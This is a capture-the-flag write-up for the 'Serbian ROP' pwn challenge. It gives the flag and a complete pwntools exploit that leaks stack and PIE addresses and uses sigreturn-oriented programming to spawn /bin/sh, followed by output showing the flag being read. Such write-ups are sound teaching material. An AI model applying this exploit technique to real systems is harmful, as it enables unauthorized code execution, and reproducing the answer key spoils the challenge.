# Serbian ROP

**Author** : Lazar Mancic  
**Difficulty** : <font color='green'>Easy</font>  
**Description**: 
Did you know that Serbia has its own ROP? Can you figure it out?

**Flag**: `SCC{d1d_y0u_kn0w_7h47_5r0p_m34n5_53rb14n_r0p!}`

## Solution

Binary is vulnerable to buffer overflow and because there is not enough gadgets for normal ROP, idea is to use Sigreturn-Oriented Programming (SROP).

```py
from pwn import *

# p = process('./serbian_rop')
p = remote('localhost', 1337)
elf = context.binary = ELF('./serbian_rop', checksec=False)

# Leaking stack address sending bytes without newline character
# write function writes content until new line or null terminator

p.send(b'A' * 0x20)
p.recvuntil(b'A' * 0x20)
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))

log.success(f"Stack leak: 0x{stack_leak:x}")

# Leaking base address using same technique

p.send(b'A' * 0x38)
p.recvuntil(b'A' * 0x38)
pie_leak = u64(p.recv(6).ljust(8, b'\x00')) - 0x1011

log.success(f"PIE leak: 0x{pie_leak:x}")
elf.address = pie_leak

# Finding gadgets necessary for SROP explotation

syscall = pie_leak + 0x101b
binsh = stack_leak - 0x30       # /bin/sh will be on stack
ret = pie_leak + 0x1048

# Creating sigreturn frame to execve("/bin/sh", 0, 0)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall

# Using buffer overflow to get SROP
# string "SRBIJA SRBIMA!" is required to leave loop

payload = b"SRBIJA SRBIMA!\x00\x00"
payload += b"/bin/sh\x00"
payload += b"A" * (0x38 - len(payload))
payload += p64(syscall)
payload += bytes(frame)

p.send(payload)

p.interactive()
```
```
[+] Opening connection to localhost on port 1337: Done
[!] Did not find any GOT entries
[+] Stack leak: 0x7ffca88f6ef0
[+] PIE leak: 0x561e42e54000
[*] Switching to interactive mode
\x00SRBIJA SRBIMA!\x00$ ls
flag.txt
run
$ cat flag.txt
SCC{d1d_y0u_kn0w_7h47_5r0p_m34n5_53rb14n_r0p!}
```